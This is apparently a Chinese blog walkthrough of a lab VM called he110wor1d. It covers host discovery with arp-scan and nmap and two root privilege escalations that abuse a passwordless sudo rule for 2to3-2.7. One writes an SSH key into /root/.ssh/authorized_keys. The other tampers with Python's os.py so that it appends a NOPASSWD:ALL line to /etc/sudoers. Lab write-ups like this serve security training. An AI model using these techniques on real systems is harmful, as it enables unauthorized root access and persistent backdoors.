---
{"dg-publish":true,"title":"Community_he110wor1d","tags":["blog"],"dg-path":"安全/靶机/Community_he110wor1d.md","permalink":"/安全/靶机/Community_he110wor1d/","dgPassFrontmatter":true}
---

```table-of-contents
```
# 主机发现

```sh
┌──(root㉿kali)-[~]
└─# arp-scan --interface=eth0 --localnet
Interface: eth0, type: EN10MB, MAC: 00:0c:29:8e:b5:fe, IPv4: 192.168.4.4
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.4.1     00:50:56:c0:00:08       VMware, Inc.
192.168.4.2     00:50:56:e9:2d:a9       VMware, Inc.
192.168.4.11    08:00:27:bf:67:19       PCS Systemtechnik GmbH
192.168.4.254   00:50:56:e1:6e:97       VMware, Inc.

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.391 seconds (107.07 hosts/sec). 4 responded

┌──(root㉿kali)-[~]
└─# nmap -sT -min-rate 10000 -p- 192.168.4.11
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-19 20:46 EST
Nmap scan report for 192.168.4.11
Host is up (0.32s latency).
Not shown: 42665 closed tcp ports (conn-refused), 22869 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 08:00:27:BF:67:19 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 53.42 seconds
```

![Pasted image 20250220094759.png](/img/user/picture/Pasted%20image%2020250220094759.png)




# 提权

```sh
lover@he110wor1d:~$ sudo -l
sudo: unable to resolve host he110wor1d: Name or service not known
Matching Defaults entries for lover on he110wor1d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lover may run the following commands on he110wor1d:
    (ALL : ALL) NOPASSWD: /usr/bin/2to3-2.7

lover@he110wor1d:~$ ls -l /usr/bin/2to3-2.7
-rwxr-xr-x 1 root root 96 Oct 10  2019 /usr/bin/2to3-2.7
lover@he110wor1d:~$ file /usr/bin/2to3-2.7
/usr/bin/2to3-2.7: a /usr/bin/python2.7 script, ASCII text executable
```


首先看一下这个工具有没有文件读取或者文件写入的功能
```sh
lover@he110wor1d:~$ sudo /usr/bin/2to3-2.7 -h
sudo: unable to resolve host he110wor1d: Name or service not known
Usage: 2to3 [options] file|dir ...

Options:
  -h, --help            show this help message and exit
  -d, --doctests_only   Fix up doctests only
  -f FIX, --fix=FIX     Each FIX specifies a transformation; default: all
  -j PROCESSES, --processes=PROCESSES
					   Run 2to3 concurrently
  -x NOFIX, --nofix=NOFIX                                                                   Prevent a transformation from being run
  -l, --list-fixes      List available transformations
  -p, --print-function  Modify the grammar so that print() is a function
  -v, --verbose         More verbose logging
  --no-diffs            Don't show diffs of the refactoring
  -w, --write           Write back modified files
  -n, --nobackups       Don't write backups for modified files
  -o OUTPUT_DIR, --output-dir=OUTPUT_DIR
                        Put output files in this directory instead of
                        overwriting the input files.  Requires -n.
  -W, --write-unchanged-files
             Also write files even if no changes were required
                        (useful with --output-dir); implies -w.
  --add-suffix=ADD_SUFFIX
			             Append this string to all output filenames. Requires
                        -n if non-empty.  ex: --add-suffix='3' will generate
                        .py3 files.
```
这个工具是将py2的代码修改为py3代码的工具
可以看到参数`-W`可以强制重写文件（即使这个文件不需要改变），或许可以做到文件写入

测试一下
```sh
lover@he110wor1d:~$ touch test
lover@he110wor1d:~$ echo "11112222333" >> test
lover@he110wor1d:~$ sudo /usr/bin/2to3-2.7 -w test
sudo: unable to resolve host he110wor1d: Name or service not known
RefactoringTool: Skipping optional fixer: buffer
RefactoringTool: Skipping optional fixer: idioms
RefactoringTool: Skipping optional fixer: set_literal
RefactoringTool: Skipping optional fixer: ws_comma
RefactoringTool: No files need to be modified.
lover@he110wor1d:~$ ls -l
total 4
-rw-r--r-- 1 lover lover 12 Feb 19 20:59 test
lover@he110wor1d:~$ sudo /usr/bin/2to3-2.7 -W test
sudo: unable to resolve host he110wor1d: Name or service not known
WARNING: --write-unchanged-files/-W implies -w.
RefactoringTool: Skipping optional fixer: buffer
RefactoringTool: Skipping optional fixer: idioms
RefactoringTool: Skipping optional fixer: set_literal
RefactoringTool: Skipping optional fixer: ws_comma
RefactoringTool: No changes to test
RefactoringTool: Files that were modified:
RefactoringTool: test
lover@he110wor1d:~$ ls -l
total 8
-rw-r--r-- 1 root  root  12 Feb 19 21:00 test
-rw-r--r-- 1 lover lover 12 Feb 19 20:59 test.bak
```


所以我们就可以尝试写入root的ssh公钥

```sh
lover@he110wor1d:~$ cat authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINTeTyoQsGWSRZ1hQZa6Nm3RYPuE+/BR+V8Q/T0TJlN1 root@kali
lover@he110wor1d:~$ sudo /usr/bin/2to3-2.7 authorized_keys -W -n -o /root/.ssh
sudo: unable to resolve host he110wor1d: Name or service not known
WARNING: --write-unchanged-files/-W implies -w.
lib2to3.main: Output in '/root/.ssh' will mirror the input directory '' layout.
RefactoringTool: Skipping optional fixer: buffer
RefactoringTool: Skipping optional fixer: idioms
RefactoringTool: Skipping optional fixer: set_literal                                                                                                                                                            RefactoringTool: Skipping optional fixer: ws_comma                                                                                                                                                               RefactoringTool: Can't parse authorized_keys: ParseError: bad input: type=1, value=u'AAAAC3NzaC1lZDI1NTE5AAAAINTeTyoQsGWSRZ1hQZa6Nm3RYPuE', context=(u' ', (1, 12))
RefactoringTool: Refactored authorized_keys
--- authorized_keys     (original)
+++ authorized_keys     (refactored)
@@ -1 +1 @@
-ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINTeTyoQsGWSRZ1hQZa6Nm3RYPuE+/BR+V8Q/T0TJlN1 root@kali
+Non
RefactoringTool: Writing converted authorized_keys to /root/.ssh/authorized_keys.
RefactoringTool: Files that were modified:
RefactoringTool: authorized_keys
RefactoringTool: There was 1 error:
RefactoringTool: Can't parse authorized_keys: ParseError: bad input: type=1, value=u'AAAAC3NzaC1lZDI1NTE5AAAAINTeTyoQsGWSRZ1hQZa6Nm3RYPuE', context=(u' ', (1, 12))
```

好像出错了，把公钥换成注释试试
```sh
lover@he110wor1d:~$ sudo /usr/bin/2to3-2.7 authorized_keys -W -n -o /root/.ssh                                                                                                                                   sudo: unable to resolve host he110wor1d: Name or service not known
WARNING: --write-unchanged-files/-W implies -w.
lib2to3.main: Output in '/root/.ssh' will mirror the input directory '' layout.
RefactoringTool: Skipping optional fixer: buffer
RefactoringTool: Skipping optional fixer: idioms
RefactoringTool: Skipping optional fixer: set_literal
RefactoringTool: Skipping optional fixer: ws_comma
RefactoringTool: No changes to authorized_keys
RefactoringTool: Writing converted authorized_keys to /root/.ssh/authorized_keys.
RefactoringTool: Files that were modified:
RefactoringTool: authorized_keys
lover@he110wor1d:~$ ls
authorized_keys
lover@he110wor1d:~$ cat authorized_keys
'''
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINTeTyoQsGWSRZ1hQZa6Nm3RYPuE+/BR+V8Q/T0TJlN1 root@kali
'''
```

```sh
┌──(root㉿kali)-[~/.ssh]
└─# ssh root@192.168.4.11 -i id_ed25519
Linux he110wor1d 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 18 08:05:40 2025 from 192.168.31.159
root@he110wor1d:~# id
uid=0(root) gid=0(root) groups=0(root)
```


# 提权2

可以发现`/usr/bin/2to3-2.7`文件本身就是一个python文件
尝试修改python库文件进行提权

```sh
lover@he110wor1d:~$ head -n10 /usr/bin/2to3-2.7
#! /usr/bin/python2.7
import sys
from lib2to3.main import main

sys.exit(main("lib2to3.fixes"))
```

去找对应的文件
```sh
lover@he110wor1d:~$ find / -name lib2to3 2>/dev/null
/usr/lib/python2.7/lib2to3
```


`2to3-2.7` 导入了main,main.py中引入了os模块
```sh
lover@he110wor1d:~$ head -n10 /usr/lib/python2.7/lib2to3/main.py
"""
Main program for 2to3.
"""

from __future__ import with_statement

import sys
import os
import difflib
import logging
```
尝试篡改一下os模块
```sh
lover@he110wor1d:~$  find / -name os.py 2>/dev/null
/usr/lib/python3.7/os.py
/usr/lib/python2.7/os.py
```
把他复制出来

```sh
lover@he110wor1d:~$ cp /usr/lib/python2.7/os.py os.py
```

在前面添加
```sh
f = open('/etc/sudoers','a')
f.write("lover ALL=(ALL:ALL) NOPASSWD:ALL\n")
f.close()
print "1111"
```

执行
```sh
lover@he110wor1d:~$ sudo /usr/bin/2to3-2.7 -w os.py -n -o /usr/lib/python2.7/
```

```sh
lover@he110wor1d:~$ sudo /usr/bin/2to3-2.7
sudo: unable to resolve host he110wor1d: Name or service not known
1111
Traceback (most recent call last):
  File "/usr/lib/python2.7/site.py", line 68, in <module>
    import os
  File "/usr/lib/python2.7/os.py", line 730, in <module>
    import copyreg as _copy_reg
ImportError: No module named copyreg
lover@he110wor1d:~$ sudo -l
sudo: unable to resolve host he110wor1d: Name or service not known
Matching Defaults entries for lover on he110wor1d:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lover may run the following commands on he110wor1d:
    (ALL : ALL) NOPASSWD: /usr/bin/2to3-2.7
    (ALL : ALL) NOPASSWD: ALL
lover@he110wor1d:~$ sudo /bin/bash
id
sudo: unable to resolve host he110wor1d: Name or service not known
root@he110wor1d:/home/lover# id
uid=0(root) gid=0(root) groups=0(root)
root@he110wor1d:/home/lover# id
uid=0(root) gid=0(root) groups=0(root)

```





